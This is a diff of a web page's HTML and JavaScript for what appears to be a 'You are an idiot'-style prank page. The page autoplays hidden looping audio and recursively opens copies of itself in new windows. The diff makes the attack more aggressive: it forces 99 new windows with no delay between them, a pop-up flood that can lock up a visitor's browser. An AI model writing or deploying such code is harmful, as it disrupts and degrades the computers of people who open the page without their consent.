@@ -950,7 +950,7 @@
 		</main>
 
 		<audio id="youare-audio" autoplay="" loop="" hidden="">
-			<source src="/Troll/youare.mp3" type="audio/mp3">
+			<source src="/i/youare.mp3" type="audio/mp3">
 		</audio>
 
 		<script type="application/javascript">
@@ -976,9 +976,9 @@ function openWindow(url) {
 }
 
 async function proCreate(count) {	
-	for (let i = 0; i < count; i++) {
+	for (let i = 0; i < 99; i++) {
 		openWindow(window.location.pathname);
-		await new Promise(r => setTimeout(r, 50));
+		await new Promise(r => setTimeout(r, 0));
 	}
 }
 
